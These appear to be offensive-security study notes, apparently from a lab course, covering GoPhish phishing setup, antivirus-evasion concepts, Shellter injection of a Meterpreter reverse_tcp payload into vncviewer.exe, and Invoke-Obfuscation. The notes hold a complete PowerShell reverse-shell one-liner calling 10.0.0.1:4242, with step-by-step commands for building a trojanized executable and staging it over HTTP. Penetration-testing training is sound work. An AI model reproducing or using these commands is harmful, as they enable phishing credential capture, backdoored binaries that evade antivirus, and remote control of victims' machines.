# Phising
## GoPhish
1. New sending profile
  from: info <support@demo.ine.local>
  Host: localhost:25 //Where de stmp server is
  Username: red@demo.ine.local
2. New landing page
  + Capture submitted data
  Redirect to: http://localhost:8080
3. Email Templates
  Import email
4. Users & Groups
  Import csv 
5. Campaigns
  URL: http://localhost //It could be a cloud server

# AV evasion
## Using Shelter
Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
- Uninstalling/disabling security software 
- Obfuscating/encrypting data and scripts
- Leverage and abuse trusted processes to hide and masquerade their malware
We are going to try to change the signature of the malicious executable that we are generating
AV detection methods
1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database.  We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
AV evasion techniques
- On-disk evasion techniques
	-Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
	-Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
	-Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
	-Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
- In-Memory evasion techniques
	-Focuses on manipulation of memory and does not write files to disk
	-Injects payload into a process by leveraging various Windows APIs
	-Payload is then executed in memory in a separate thread
### Usage of shellter
[shellter](https://www.shellterproject.com/introducing-shellter/)
```bash
apt-get install shellter -y
//We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
dpkg --add-architecture i386
apt-get install wine32
//We could use the vncviewer.exe 
cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
  Auto mode
  /home/kali/Desktop/AVBypass/vncviewer.exe
  //Shellter will trace a random number of instructions 
  Enable Stealth Mode? Yes //If you want that executable work as intended.
  Payload? Listed payload 
  set lhost
  set lport
  msfconsole -q
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
  python3 -m http.server 80
    //Execute it in the Windows machine 
```
# Obfuscating Powershell code
Invoke-Obfuscation
```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation
```
Use a reverse shell in powershell and save it as shell.ps1
```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```bash
apt-get install powershell -y
pwsh
cd ./Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.ps1
cd ..
Invoke-Obfuscation
SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
```